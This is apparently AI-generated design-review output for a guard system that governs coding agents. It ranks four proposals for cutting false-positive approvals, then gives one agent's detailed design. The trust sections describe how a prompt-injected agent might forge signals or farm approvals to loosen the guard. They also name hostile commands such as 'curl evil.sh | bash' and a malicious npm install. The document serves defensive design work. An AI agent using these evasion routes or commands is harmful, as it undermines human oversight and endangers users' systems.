### Judge: Thesis and Constitution — does the candidate strengthen the intercept→decide→approve→prove loop for UNATTENDED runs, or bolt a new subsystem beside it; surface-budget cost against ceilings that are ALL at 100% right now; MAINTAINER.md constitutionality; regrowth risk in a repo that regrew full sprawl in four months; complexity honesty; runtime parity.

**Ranking (best first):** Precedent — learned allow-grants mined from adjudicated approvals > Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling > Task Envelope Authorization (Reach-Bounded Envelopes) > Intent Warrants — server-signed attribution receipts that narrow, never widen

| Candidate | Score | Reasoning |
|---|---|---|
| Precedent — learned allow-grants mined from adjudicated approvals | 9/10 | THESIS-native, not thesis-adjacent. THESIS.md's fifth wedge bullet IS this mechanism verbatim: 'calibrated interruptions — a controller that tunes the interruption threshold from your approve/deny stream ... so governance earns its interruptions instead of nagging you into disabling it.' Precedent diagnoses why the shipped version failed (verified: parseCalibrationSettings defaults mode to 'off' at calibration.ts:120, and its own docblock at :20-25 says it only ever RAISES) and closes the loop over the same approve/deny stream on the existing human-ratified rail. It touches no attendance signal, so it never re-enters the at-keyboard competition THESIS explicitly cedes. It strengthens decide (the label fix) and approve (learning from adjudications) INSIDE the loop rather than adding a fifth verb beside it. SURFACE: genuinely zero and the only one with no dodge — verified allow_grant is already 1 of the 16 KNOWN_POLICY_TYPES, /api/policies/loosening exists and is admin-gated (route.ts:176), TriageInbox exists, and flags ride in guard_decisions.context jsonb so there are ZERO migrations, ZERO hook events, and ZERO new guard-payload fields. Cheapest of the four by a wide margin. CONSTITUTION: the best §3 story available — every loosening is a per-instance human click on a specific, evidenced, dated, expiring, single-deny-cancelling proposal, which is precisely the shape §3 demands. Blocks unreachable (verified at applyAllowGrants:307, which returns unless highestDecision is warn/require_approval). It admits its own §2 gap (the loosening ratify route is role-gated but lacks the approvals route's anti-self-approval principal check) rather than hiding it. It is the ONLY candidate that argues FOR keeping interruptions permanently — refusing to fix the force-push case on 'precision of interruption is THE metric' grounds. REGROWTH: lowest by far. Two constants and two pure functions in policy-shapes.ts plus one rule in an engine that already exists. It names its own sprawl vector (pressure to add 'apply\|' or 'other\|' to PRECEDENT_ELIGIBLE) and proposes surface-budget-style ratchet discipline for it. COMPLEXITY HONESTY: best in the set. Its Step 1 — the ~5-line isRegenerableArtifactTarget subtree fix — is the simpler change that gets most of the benefit, and I verified the bug is real: './node_modules/.cache' fails the bare-name set at evidence.ts:107-112 while 'node_modules' passes, so deleting a subtree scores HIGHER than deleting the whole thing. The code comment directly above that function already states the thesis rationale ('a safety system that blocks routine artifact cleanup trains the operator to turn it off — alarm fatigue is how governance actually dies'). Precedent ships that fix first and standalone. It also loudly states its loop may never fire on the owner's own instance. PARITY: perfect — zero hook changes means byte-identical behavior on Claude Code, Codex, Hermes and Desktop. The only candidate with no parity cost at all. Held off 10 because it structurally cannot help a first occurrence (the literal complaint), and because the ratify handler today only mutates an EXISTING policy (verified: applyLooseningRelaxation narrows an envelope or deactivates, and validateSnapshot requires a policyId) — inserting a fresh allow_grant is a real capability extension it slightly undersells. |
| Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling | 7/10 | The only candidate that makes the UNATTENDED case STRICTER, which is the axis THESIS actually cares about — every relief mechanism shipped to date is a pure loosening, and this is the first that pays for its quiet by adding governance where the product says governance is needed. The R axis ('could I get this back?') is a genuine decide-phase improvement inside the loop, not a new subsystem beside it, and it is derived from bytes the server already classifies. Both of its classifier corrections check out in source: isRegenerableArtifactTarget is bare-name-only (evidence.ts:107-112) and '--force-with-lease' really is conflated with '--force' in a single regex at evidence.ts:296, so the lease split is a real, byte-provable recoverability fact the current code throws away. SURFACE: zero and credible — PATCH /api/sessions/[sessionId] genuinely exists (route.ts:28), both passes are builtins so KNOWN_POLICY_TYPES is untouched, and columns/migrations are unbudgeted. THESIS DRAG: the A axis is the same at-keyboard machinery as C1/C4, and A2 ('an operator was in the DashClaw UI within the TTL') is a presence requirement that sits awkwardly beside the remote/async-approval wedge — the whole point of which is that you are NOT looking. CONSTITUTION: the tighten-only floor is fine and has direct precedent in calibration.ts. The relief is auto-applied per-instance behind an org toggle, the same class as C1, but its ceiling argument is the strongest in the set: relief reaches only R0/R1, which are already allow/warn under catastrophe-only, so net new authority from a COMPLETE forgery of every client signal is genuinely near zero. REGROWTH: medium — a new R0–R4/R? taxonomy that will want to grow, but contained in one leaf module mapping onto flags that already exist. COMPLEXITY HONESTY: partial credit. It says outright that S1 is solved by the blast-radius axis alone with zero trust in any human signal, which is exactly the right instinct, but it never draws the obvious conclusion that the two ~20-line classifier widenings ARE the 80% fix and the entire attendance half is a separate, much larger feature. PARITY: the real cost — Codex and Desktop sit permanently at A0 and receive the tightening floor while never receiving the relief, so shipping this makes Codex strictly noisier. That is a regression against a shipped invariant, honestly flagged as a rollout-ordering hazard rather than buried. |
| Task Envelope Authorization (Reach-Bounded Envelopes) | 5/10 | The best trust engineering of the three presence-based designs: making the envelope's authority CONSTANT so the prompt grants nothing kills the prose-parsing sprawl vector outright, and it is the correct answer to C1's biggest problem. But it optimizes the case THESIS explicitly cedes, and says so in its own FN-7: 'Everything Claude Code's own permission prompt would have caught, DashClaw now stays silent on while a human typed in the last 30 minutes — precisely the window THESIS says is not the wedge.' Naming it a feature does not make it one. 'Human typed recently → workspace-local runs silently' is close to a reimplementation of the harness's own acceptEdits/session allowlist, for free, from the vendor. SURFACE: zero by the counter and I verified the mechanism — app/api/sessions/[sessionId]/events/route.ts exists with GET only, and countApiRoutes increments once per FILE exporting ≥1 method, so adding POST is invisible. That is the same dodge class as C1's ?mint=intent, though marginally cleaner as REST. It also adds an unbudgeted table + reaper, a hook event, a repository, a guard module and a component. CONSTITUTION: the weakest §3 story of the four. The envelope auto-mints on EVERY prompt with no per-instance ratification and no clearly-stated org enable/disable gate, and immediately begins downgrading require_approval→allow; the human's only control is a Revoke button after the fact. C1 and C2 at least require a human to set a ceiling/toggle first, and C3 requires a click per proposal. The 'Widen' flow is properly ratified; the base grant is not, and that is exactly the auto-applied-loosening line. Blocks are correctly untouched and the ungrantable gate is correctly reused. REGROWTH: medium-high, and the specific seed is bad — computeReach becomes a THIRD command classifier (NON_LOCAL_VERB_RE, URL_OR_HOST_RE, NEVER_R0_PATH_RE) alongside bash_classifier.py and evidence.ts, which recon already proved disagree with each other on ordinary dev commands. A third regex vocabulary in a repo whose documented failure mode is two mirrors drifting is a sprawl seed the surface budget cannot see. COMPLEXITY HONESTY: weakest — it never names the far simpler classifier/label fix that its own S1 would benefit from, and never asks whether the table, the hook, and the reach module are earning their keep against it. PARITY: Claude Code only, but unlike C2 it causes no Codex regression (behavior identical), and the delta is properly recorded in PLUGIN_PARITY.md. |
| Intent Warrants — server-signed attribution receipts that narrow, never widen | 3/10 | The worst thesis fit in the set, and the design knows it. The recency term decays linearly to zero over the 20-minute TTL, so the warrant fires ONLY when a human typed recently and by construction does nothing for unattended runs — its own S3 walkthrough confirms the warrant is never even consulted. The candidate calls that decay 'the product's stated wedge'; it is the inverse. THESIS cedes the at-keyboard user to native permission prompts explicitly and for free, and this is a large new subsystem built to serve exactly that window. It adds a fifth verb (attribute) beside intercept/decide/approve/prove rather than strengthening any of the four. SURFACE: the most visible dodge — ?mint=intent is not a mode of guard evaluation the way ?record=true is (that flag performs the same evaluation with a side-effecting insert; this is an entirely different operation sharing a URL), and the candidate concedes the clean version is +1/131 with a THESIS amendment. Plus 3 settings keys, a new crypto module, a new session_event type, a new hook event. CONSTITUTION: the loosest §3 reading of the four. A human clicks one toggle labelled 'Trust my own requests,' after which agent-transported prose selects which slice of the ceiling is live on every subsequent call. That is a further step from 'a human ratifies the change' than allow_grant (human authors the specific grant), C3 (human clicks the specific proposal), or even C2 (byte-derived, no text involved). REGROWTH: highest in the set, and the specific mechanism is the tell — a prose→action_type synonym mapper living in the governance kernel. Synonym tables grow without bound, the budget cannot see them, and its own failure-modes section already predicts vocabulary drift against bash_classifier.py and evidence.ts as the most likely thing to rot. Warrants, envelopes, ceilings with three positions, three-component alignment grading, prompt-text persistence with redaction — this is the seed of an 'intent' subsystem, in the repo that regrew 142 routes in four months. COMPLEXITY HONESTY: self-indicting. It states plainly that the owner's strongest evidence (8/8 blunt-70 false-positive blocks) is untouched by its design and that the classifier fix is a separate necessary change — then ships the large subsystem anyway. That is precisely the 'why didn't you just...' failure. PARITY: Claude Code only, with Hermes needing a third implementation. Not a 2 because the intersection-with-ceiling monotonicity argument (client text may only NARROW authority, the dual of D1) is genuinely rigorous and correct, and the /approvals provenance line — attribution rendered on every card even when the warrant does NOT fire — is a cheap, thesis-aligned improvement to the approve step that stands on its own. |

**Fatal flaws**

- [Intent Warrants — server-signed attribution receipts that narrow, never widen] LOAD-BEARING — The recency term decays to zero over the 20-minute TTL, so the mechanism fires ONLY inside a window where a human just typed — by construction it serves the at-keyboard user THESIS.md explicitly cedes to native permission prompts, and does nothing whatsoever for the unattended runs that are the product's stated subject (its own S3 confirms the warrant is never consulted). Removing the decay is not an option: the decay is what makes the trust argument survive an unattended compromise.
- [Intent Warrants — server-signed attribution receipts that narrow, never widen] FIXABLE — A prose→action_type synonym mapper inside the governance kernel is an unbounded-growth surface the budget gate cannot count, in the repo whose named falsifier #3 is regrowth. Its own failure-modes section predicts this drifts against bash_classifier.py and evidence.ts and calls it 'the most likely thing to rot'.
- [Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling] FIXABLE — Codex and Claude Desktop cannot mint A1 (verified: cli/lib/codex/install.js writes exactly PreToolUse/PostToolUse/Stop/SessionStart, and Desktop runs no hooks), so on ship they receive the tightening floor and never the relief — a shipped runtime-parity invariant regresses and Codex installs get strictly noisier.
- [Floor & Ceiling — Blast-Radius Floor, Attendance Ceiling] FIXABLE — The first-install grace deliberately returns A1 (attended) for any org that has never stamped a human turn — the one place the design fails OPEN rather than closed, because 'unattended' and 'the hook is not installed' are indistinguishable. Correctly reasoned and recorded, but it is a fail-open in a fail-closed product and will be read as a constitutional smell in review.
- [Precedent — learned allow-grants mined from adjudicated approvals] FIXABLE — It learns only from approved_by, and the owner's own instance has zero recorded approvals ever while his eight documented false positives were BLOCKS at risk 100 — blocks produce no approval evidence by design (policy-tuning/engine.ts:258). On his real data the mining query returns nothing and the loop never fires, so it may deliver zero relief to the person who filed the complaint.
- [Precedent — learned allow-grants mined from adjudicated approvals] LOAD-BEARING — Cannot help a first occurrence at all — a 5-approvals-across-2-days threshold means day one is unchanged, while the owner's complaint is specifically about approving the thing he just asked for.
- [Task Envelope Authorization (Reach-Bounded Envelopes)] FIXABLE — The envelope auto-mints on every prompt with no per-instance and no clearly-stated org-level human ratification, then immediately downgrades require_approval→allow for up to 40 actions; Revoke is after-the-fact. That is the closest any candidate comes to MAINTAINER.md §3's 'no auto-applied enforcement changes, ever' — C1/C2 at least require a human to set a ceiling first, and C3 requires a click per proposal.
- [Task Envelope Authorization (Reach-Bounded Envelopes)] FIXABLE — computeReach introduces a THIRD command classifier (three new regex vocabularies) beside bash_classifier.py and evidence.ts, which recon already proved disagree with each other on ordinary dev commands like `npm run` and `npx`. A third mirror to keep in sync is a regrowth seed the surface budget cannot see.

**Best idea to graft:** From Floor & Ceiling: the recovery/blast-radius axis as a DECIDE-phase input — specifically (a) the two byte-level classifier corrections and (b) the R-sets-a-floor composition rule. Both halves are things Precedent lacks. (a) I verified both bugs in source: isRegenerableArtifactTarget (evidence.ts:107-112) is a bare-name set membership test, so './node_modules/.cache' fails while 'node_modules' passes — deleting a subtree scores HIGHER than deleting the whole allowlisted directory; and evidence.ts:296 matches '--force' and '--force-with-lease' in one regex, discarding the fact that a lease is byte-proof the overwritten tip was in your reflog. Both are ~20-line fixes needing no new signal, no hook event, no trust argument, no surface, and no runtime-parity cost, and they take the owner's own S1 case from block-at-100 to allow-at-65 and the force-push case from unappealable block to approvable. (b) More importantly for the thesis: Precedent is a pure friction-reducer and adds ZERO governance where THESIS says governance is needed. Grafting the R-floor — at A0 (or simply 'no live human signal'), an act with no provable recovery ceiling raises to require_approval and gets stamped ungrantable at R4 so no accumulated grant pile can clear it — gives the winner the other half: a mechanism that gets stricter the longer the human is away. That is the only proposal in the set that makes unattended runs stricter, it uses raiseDecision so it is constitutionally free (tighten-only, direct precedent in calibration.ts), and it costs zero budgeted surfaces. Graft the floor with attendance defaulted to 'unknown' so it needs no UserPromptSubmit hook and therefore no Claude-Code-only parity cost.

**Verdict:** Precedent wins this lens decisively, and it is not close. It is the only candidate that repairs the mechanism THESIS.md names as the wedge rather than building a new one beside it: 'calibrated interruptions — a controller that tunes the interruption threshold from your approve/deny stream, so governance earns its interruptions instead of nagging you into disabling it.' It is the only one that never touches human presence and therefore never re-enters the at-keyboard competition THESIS explicitly cedes. It is the only one with a genuinely zero-cost surface story and no budget dodge — no route, no page, no policy type, no migration, no hook event, no new guard-payload field — which matters because I confirmed all eight ceilings sit at exactly 100% today (131/131, 53/53, 17/17, 3/3, 39/39, 59/59, 14/14, 16/16), so any new route, page, or policy type fails the build outright. It is the only one with perfect runtime parity, because zero hook changes means byte-identical behavior on Claude Code, Codex, Hermes and Desktop. It has the cleanest §3 story (every loosening is one human click on one dated, expiring, single-deny-cancelling proposal) and it is the only candidate that argues FOR keeping some interruptions permanently, refusing to make the force-push click disappear on 'precision of interruption is THE metric' grounds. THE LOUD COMPLEXITY-HONESTY POINT, which the synthesizer must not lose: the simplest change that gets most of the benefit is real, verified, and about five lines. isRegenerableArtifactTarget at evidence.ts:107-112 is a bare-name set membership test, so 'rm -rf ./node_modules/.cache' fails the allowlist and grades destructive/80→100 while 'rm -rf node_modules' passes and grades cleanup/45 — deleting a subtree of an allowlisted directory scores HIGHER than deleting all of it. The comment sitting directly above that function already states the thesis rationale ('a safety system that blocks routine artifact cleanup trains the operator to turn it off — alarm fatigue is how governance actually dies'). Two candidates independently found this bug. Ship that fix, plus the '--force-with-lease' split at evidence.ts:296, FIRST and ALONE, before any learning loop, warrant, envelope, or attendance lease. Those two edits cost zero surfaces, zero hooks, zero trust argument, zero parity, and by both candidates' own walkthroughs they take the owner's complaint case from block-at-100 to allow-at-65. Anything shipped on top of them must justify itself against that baseline, measured. Precedent's own Step 1 is exactly this, which is the strongest evidence it understood the problem. The two rejected presence-based designs (Intent Warrants, Task Envelope) should not be revived later under a different name: both buy quiet in the twenty-to-thirty-minute window after a human types, which is the one window the product already conceded to a free competitor, and both do it by adding subsystems (a prose synonym mapper; a third command classifier plus a table) that the anti-regrowth gate cannot see."

---

## Other agent output

### ab4bcfc52ac9fbc2f

# Calibration decision: fix the label, keep the evidence, learn only from adjudicated approvals

## The verdict

First we fix the scoring bug that makes deleting a cache folder **inside** `node_modules` score 100 while deleting **all of** `node_modules` scores 35 — a five-line widening applied to both copies of the classifier (server and hook) in one commit, pinned by golden vectors; this alone converts the complained-about blocks into silent allows. Second, the server starts **keeping** the evidence tags it already computes for every command (`regenerable_artifact`, `destructive`, `remote_exec`, …) instead of throwing them away, so every decision records exactly what kind of act was graded. Third, when Wes approves the same narrowly-tagged safe shape five times across two different days, the `/policies` page offers him **one button** that stops asking about that exact shape for 14 days — one denial cancels it forever, and blocked actions and dangerous shapes are structurally unlearnable.

Grafted from the losers: Floor & Ceiling's rule that a classifier fix must land in **both** mirrors (`evidence.ts` + `bash_classifier.py`) in one commit with paired vectors, because the `max()` fold makes the worse label final; and Task Envelope's fail-closed reach principle, satisfied here not by a third regex classifier but by admitting only shapes whose **flag itself proves workspace-boundedness**. I rejected all three presence/attendance mechanisms (Intent Warrants, attendance leases, task envelopes) for one shared reason: each one's mint rides the governed agent's own credential, so the "out-of-band" signal is forgeable with one HTTP call — and I rejected the `--force-with-lease` split on arithmetic (see misses).

## Why the current system is miscalibrated

The gating variable behind the complaint is not the threshold and not the policy set — it is the **label**, and the label has a monotonicity bug in both classifiers. `isRegenerableArtifactTarget` (app/lib/guard/evidence.ts:107-112) and `_is_regenerable_dir_name` (hooks/dashclaw_agent_intel/bash_classifier.py:310-314) both test targets by **bare-name set membership**, so `rm -rf ./dist ./node_modules/.cache` fails the allowlist (`node_modules/.cache` is not a bare name), `.every()` fails (evidence.ts:281), and the command grades bare `destructive`: security base 80 + irreversible 15 + goal-pattern 20 = clamped **100** — identical to `rm -rf ~`. The client classifier misfires the same way, and trust rule D1's `max()` fold (app/lib/guard/risk.ts:87-94) guarantees the **worse** of the two labels is final, so fixing only one side fixes nothing. At 100, the default pack's only risk rule is a hard block (app/lib/guardrails/packs/catastrophe-only — `threshold: 100, action: block`; same rule in claude-code mode at app/lib/policy-modes/compile.ts:113), which is unappealable by constitution. And every correction channel is structurally unable to reach a mislabeled score: `allow_grant` must be hand-authored before the shape ever occurs, the operator grant covers only a byte-identical retry within 15 minutes (evaluate.ts:341-344), loosening needs ≥10 fired interrupts at a 95% override rate (app/lib/posture/loosening.ts:19-27), and the v4.74 calibration controller is tighten-only by its own charter. **Genuinely broken:** the subtree-scores-higher-than-whole label bug, live in both mirrors. **Looks broken but is not:** the 100→block rail (working as designed), the categorical `require_approval` envelopes (claude-code-starter keys on `action_types: [api]` and `[build]` at packs/claude-code-starter/policies.yml:42-47 and :66-71 — deliberate), and the literal phrase "approving commands at risk 100" — under Wes's pack a 100 is a *block*, not an approval; his golden-vector history records maintainer **blocks** at 100 on benign commands, which is the same defect wearing a different verdict.

## The new decision function

**Part A — slice 1, the label fix (both mirrors, one commit).**

```ts
// app/lib/guard/evidence.ts:107 — WIDENED. A proper relative subtree of a
// regenerable root is regenerable: if deleting all of `node_modules` is
// routine (it is allowlisted), deleting `node_modules/.cache` cannot be worse.
// The name list itself (evidence.ts:57-60) does NOT grow — the 2026-08-05 F5
// conservatism (no `build`/`out`/`target`) stands.
function isRegenerableArtifactTarget(target: string): boolean {
  if (/[*?[]/.test(target)) return false;                       // globs: unchanged
  let t = target.replace(/\\/g, '/').replace(/\/+$/, '');
  if (t.startsWith('./')) t = t.slice(2);
  if (!t || t.startsWith('/') || t.startsWith('~') || /^[a-z]:/i.test(t)) return false; // absolute/home: never
  const parts = t.toLowerCase().split('/');
  if (parts.includes('..')) return false;                       // traversal: never (load-bearing —
                                                                //   `node_modules/../src` must fail)
  if (REGENERABLE_ARTIFACT_DIRS.has(parts[0]) === false) return false;
  return parts.length === 1 || true;                            // bare name OR subtree of a listed root
}
```

The identical widening lands in `_is_regenerable_dir_name` (bash_classifier.py:310-314), consumed by `is_regenerable_artifact_rm` (:317-331, which already rejects globs) and by the pretool `cleanup` remap (hooks/dashclaw_pretool.py:476-478). Client result for the S1 command: cap at `_REGENERABLE_RM_BASE = 35` (bash_classifier.py:303) instead of 100.

**Part B — slice 2, keep the coordinate the server already computes.**

```ts
// app/lib/guard/risk.ts:102-108 — EvidenceDerivedBreakdown gains one field:
//   flags: string[];   // sibling term only; NEVER enters any hashed vector
//                      // (score-provenance invariant, risk.ts:96-101)

// app/lib/guard/evaluate.ts:841 foldEvidenceIntoContext — two added lines:
  context.evidence_flags = evidence.flags;      // SERVER-SET-ONLY (see trust argument)
  return { derived_action_type: evidence.base_risk /*…existing…*/, flags: evidence.flags, … };
// Flags then persist automatically inside guard_decisions.context._risk_breakdown
// via the additive-jsonb pattern the code itself endorses (evaluate.ts:740-746).
// ZERO migrations. app/lib/validate.js is DELIBERATELY UNCHANGED:
// `evidence_flags` stays absent from GUARD_INPUT_SCHEMA (validate.js:292-344),
// so validate() strips any client-sent copy before evaluateGuard runs.
```

**Part C — slice 3, the precedent predicate and the loop.**

```ts
// app/lib/policy-shapes.ts — NEW, the safety core. A CLOSED allowlist:
// every shape not enumerated is unlearnable forever, at any approval count.
// ADMISSION RULE (recorded, ratchet-disciplined like the surface budget):
// a shape is listed only if its worst case over ALL inputs the classifier
// grades into it is recoverable by re-running a build command, AND its flag
// set itself proves workspace-boundedness.
export const PRECEDENT_ELIGIBLE = new Set([
  'cleanup|destructive,regenerable_artifact',
  // `regenerable_artifact` only sets when EVERY delete target passes
  // isRegenerableArtifactTarget (evidence.ts:281), which rejects globs,
  // absolute paths, `~`, and `..` — so this shape is workspace-bounded BY
  // CONSTRUCTION. No reach classifier needed.
]);
// NOT listed, deliberately and permanently without a recorded decision:
//   'build|package'  — npm/pip install of ANY package lands here (evidence.ts:300-301);
//                      a ratified precedent would allow `npm install evil-pkg`
//                      (postinstall = RCE) with zero clicks. Security judge's
//                      fatal flaw; the pressure to add it will be constant. NO.
//   'other|'         — the unclassified default bucket (evidence.ts:259-260);
//                      listing it grants everything the parser cannot read.
//   anything with:   protected_target, device_write, interpreter_destructive,
//                    remote_exec, secret_exposure, sensitive_path, privilege,
//                    deploy, vcs_dangerous  (redundant NEVER_PRECEDENTED gate).

export function precedentKey(actionType: string, flags: string[]): string {
  return `${actionType}|${[...flags].sort().join(',')}`;
}
export function precedentEligible(actionType: string, flags: string[]): boolean {
  if (flags.some((f) => NEVER_PRECEDENTED.has(f))) return false;
  return PRECEDENT_ELIGIBLE.has(precedentKey(actionType, flags));
}

// grantMatches (policy-shapes.ts:123-144) — EXTENDED. Field absent ⇒
// byte-identical to today. Field present ⇒ strictly TIGHTENS the match.
export function grantMatches(rules: GrantRules, context: GrantContext): boolean {
  if (context.declared_action_type && context.declared_action_type !== context.action_type)
    return false;                                            // :132-138 unchanged (reclass firewall)
  if (typeof rules.action_type !== 'string' || rules.action_type !== context.action_type)
    return false;                                            // :139-141 unchanged
  if (Array.isArray(rules.precedent_flags)) {                // NEW
    const ctx = context.evidence_flags;
    if (!Array.isArray(ctx)) return false;                   // no act ⇒ no flags ⇒ NO coverage
    const want = rules.precedent_flags as string[];
    if (ctx.length !== want.length) return false;            // EXACT SET EQUALITY, never subset:
    const have = new Set(ctx as string[]);                   //   {destructive,regenerable_artifact}
    if (!want.every((f) => have.has(f))) return false;       //   must not cover {destructive,…,privilege}
    if (!precedentEligible(String(rules.action_type), want)) // re-checked AT MATCH TIME: an allowlist
      return false;                                          //   tightening retroactively disarms grants
  }
  if (rules.target_prefix == null) return true;              // :142-143 unchanged
  return targetPrefixMatches(String(rules.target_prefix), context);
}
```

**Where each verdict comes out, and composition with the lattice** (all line refs verified this session):

```text
INPUTS
  act                    hook: _build_act, dashclaw_pretool.py ~1600-1660 (the bytes that execute)
  evidence flags         SERVER: classifyAct (evidence.ts:481) inside foldEvidenceIntoContext (evaluate.ts:841-885)
  risk terms             SERVER: serverRiskTerms (risk.ts:63-71); client risk_score via validate.js:295
  precedent grant row    HUMAN: ratified via POST /api/policies/loosening (existing admin route)
  deny/approve labels    HUMAN: approvals route stamps approved_by / [HITL Decision: DENY]

PIPELINE (evaluate.ts) — nothing above the grant pass changes:
  :841  foldEvidenceIntoContext        — mismatch swap unchanged; NOW also keeps flags
  :988  computeRiskAssessment          — D1 max() fold (risk.ts:87-94) UNTOUCHED; precedent never changes a number
  :1021 runLocalPolicies               — raise-only  → warn / require_approval / BLOCK come out here
  :1022 scanPromptInjection            — raise-only
  :1029 containment_promote raise      — raise-only
  :1040 runWebhookPolicies             — raise-only
  :1044 runCalibrationController       — tighten-only (unchanged)
  :1051 applyAllowGrants               — ★ PRECEDENT ACTS HERE AND ONLY HERE ★
        :306 containment_promote        → return (precedent can never cover a merge)
        :307 decision not warn/req_appr → return (BLOCK IS UNREACHABLE — absolute)
        :312 ungrantable gating policy  → return (catastrophe/control-plane rules survive)
        :330 grantIsExpired (14d TTL)   → skip stale grant
        :331 grantMatches (extended)    → :334 highestDecision = 'allow'   ← the ONLY new allow exit
  :1060 applyOperatorApprovalGrant     — unchanged
  :1074 applyPlanStepGrant             — unchanged (operator DENY still raises to block after)
  :1187 applyBlockOverride ×2          — unchanged (replay/act-binding still block a precedent-allowed act)
```

**Missing or stale input ⇒ fail closed, every path:**

| Input state | Behavior |
|---|---|
| No `act` attached | `classifyAct` → null → `evidence_flags` undefined → precedent branch returns false; decision stands |
| Client POSTs `evidence_flags` | Stripped by the GUARD_INPUT_SCHEMA whitelist before evaluation (validate.js:292-344); regression test pins this |
| Flag set differs from ratified set (any direction) | Exact equality fails; decision stands |
| Shape removed from allowlist after ratify | Match-time `precedentEligible` re-check fails; grant goes inert, surfaced via app/lib/inert-policies.ts |
| Grant older than 14 days | `grantIsExpired` (evaluate.ts:330 / policy-shapes.ts:89-92) skips it |
| Declared/derived action_type mismatch | Reclassification firewall (policy-shapes.ts:132-138) fails the grant closed |
| Any deny or block on the shape in the mining window | Loop gates (`maxDenials: 0`) emit no proposal; an existing precedent is revoked by the ratify route on the next deny |
| Corrupt grant rules JSON | evaluate.ts:320-327 skips and reports unenforceable |

**The mining rule** (new rule in the existing loosening engine, app/lib/posture/loosening.ts, fed by a sibling of `getInterruptOutcomesByPolicyAction`, app/lib/repositories/loosening.repository.ts:61-104, keeping its `::timestamptz` cast and synthetic exclusion): group `require_approval` decisions by `(action_type, sorted evidence flags)` from the persisted `_risk_breakdown`; propose only when `approved ≥ 5`, `denied = 0`, `blocked = 0`, `distinct_days ≥ 2`, shape on the allowlist. Ratify (admin-gated, non-null principal, same pattern as the route's existing POST) inserts an ordinary `allow_grant` row with `precedent_flags`, `expires_at` = now+14d, `max_uses: 50` (swept at read time; the TTL, not the counter, is the hard bound). The server rebuilds the grant from its **own** mined evidence, never from the client body — the rule this engine already states (loosening.ts:84-85).

## The trust argument

**Rule D1 is not bent — it is not touched.** D1 governs the risk fold: client signals may only raise, because the server score derives from client-declared descriptors (risk.ts:81-94). This design edits no line of `computeEffectiveRisk` or `computeRiskAssessment` and adds no term to the `max()`. The downgrade happens at the decision layer, inside `applyAllowGrants` — a pass that already exists, already excludes `block` (evaluate.ts:307), already honors `ungrantable` (:312-316), and already fails closed on reclassification (policy-shapes.ts:132-138).

**The signal that lowers is not client-authored, and that is mechanical, not asserted.** `evidence_flags` is set in exactly one place: `foldEvidenceIntoContext` (evaluate.ts:841), from `classifyAct(context.act)` — the server's own parse of the bytes that will execute. It is deliberately absent from `GUARD_INPUT_SCHEMA` (validate.js:292-344, a strict whitelist whose own comment says unlisted fields are stripped). A prompt-injected agent that POSTs `{"evidence_flags":["regenerable_artifact"]}` has the field deleted before `evaluateGuard` runs. To *earn* the flag, the agent must submit a command the server's parser reads as a bounded delete of regenerable subtrees — and if it submits that, **that is what runs**; act-binding (`applyBlockOverride` at evaluate.ts:1187-1188, running *after* the grant pass) still blocks any classified-vs-executed divergence. The claim "the user asked for this" lands in `declared_goal`, which nothing in this design reads to lower anything.

**Human ratification is the second lock.** No precedent exists until an admin with a non-null principal clicks Ratify on a proposal built from the org's own approve/deny history. Nothing auto-applies (MAINTAINER.md §3). One deny kills the shape forever; the existing loosening engine tolerates 5% overrides, this tolerates zero.

**What an attacker CAN still do — the residual, plainly:**
1. **Farm the one eligible shape.** Spam regenerable-cleanup attempts until a fatigued human approves five times across two days, then hold a 14-day precedent. Ceiling: up to `max_uses` deletions of regenerable build artifacts. That is annoying, not catastrophic — and it is the admission rule holding, not failing.
2. **Exploit slice 1 directly.** After the relabeling, an injected agent deletes `node_modules`, `dist`, `.next` and their subtrees silently at ~65. This is already true today for the bare names (the deliberate 2026-08-05 F5 decision, evidence.ts:47-56); the widening extends it to subtrees, which are strictly smaller deletions.
3. **DoS the loop** by drawing a deny onto a shape Wes wants. Direction: more interruptions, not fewer. Fail-safe.
4. **Nothing here fixes S4.** `curl evil.sh | bash` grades `remote_exec`/security base 70 (evidence.ts:341-366), folds to ~95, and **allows today** under catastrophe-only (block needs 100) — verified independently by two judges. My design neither causes nor widens this; no precedent can ever form on `remote_exec`. It is flagged below as a separate tightening decision.
5. On a self-host where the agent holds `DATABASE_URL`, it can forge anything, including `approved_by` — the position the codebase already records at app/api/approvals/[actionId]/route.ts (the `operator` exception): if the agent holds root, the gate was already forfeit.

## What we now accept as a miss

- **S5, same-session scope creep to production: not caught, damage unbounded.** `npm run db:migrate` against local and against prod are byte-identical to every layer; `systems_touched` is dead on the standard hook path (the hook always sends the tool category `execution`, which matches neither list at risk.ts:20-21). No signal available today distinguishes them without a forgeable client claim, so I ship no fake fix. Both calls stay `allow` (~40). Closing this requires the hook to derive systems from the resolved DSN — a separate, tighten-only change.
- **S4 stays open, and it is open today.** Pipe-to-shell at ~95 allows under the default pack. Pre-existing; named; out of scope; deserves its own decision (a catastrophe-pack rule on `remote_exec` would be a *tightening* and is the natural next ship).
- **The loop is blind to blocks, which is most of Wes's own history.** It learns from `approved_by`, blocks produce no approval evidence, and his local DB has zero recorded approvals ever. Day-one relief comes entirely from slice 1; the loop is the standing correction channel for the categorical-envelope class (claude-code-starter's `[api]`/`[build]` holds, custom envelopes) and for hosted users. Block-override labeling is named future work, not smuggled in.
- **Cold start:** a precedent needs 5 approvals across ≥2 days. Nothing improves on day one via the loop, by construction.
- **Org-scoped precedents fire at 3 a.m.** A precedent earned at the keyboard covers an unattended run. Bound: regenerable artifacts only, ≤50 uses, ≤14 days. Accepted deliberately; the alternative (attendance signals) was rejected as forgeable.
- **`--force-with-lease` stays blocked, deliberately.** Splitting the lease flag (evidence.ts:296 conflates it with bare `--force`) would land it at ~85 (apply 60 + irreversible 15 + push-goal 10) — and under both shipped configurations there is **no require_approval band between 85 and the 100 block**, so the split converts an unappealable block into a *silent allow* for a shared-ref history rewrite. That fails the S2 consensus. Deferred until a `require_approval` band exists to receive it. This overrides two judges, on arithmetic.
- **Flag churn silently disarms precedents.** A future evidence.ts flag addition breaks exact equality; interrupts return unexplained. Mitigated (not solved) by inert-precedent surfacing and by the proposal re-forming.
- **A directory named `dist` holding real content is deleted silently.** The conservative name list (no `build`/`out`/`target`, evidence.ts:53-56) is the mitigation; the residual is real.

## The five scenarios

| Scenario | Today (verified) | New design | Why |
|---|---|---|---|
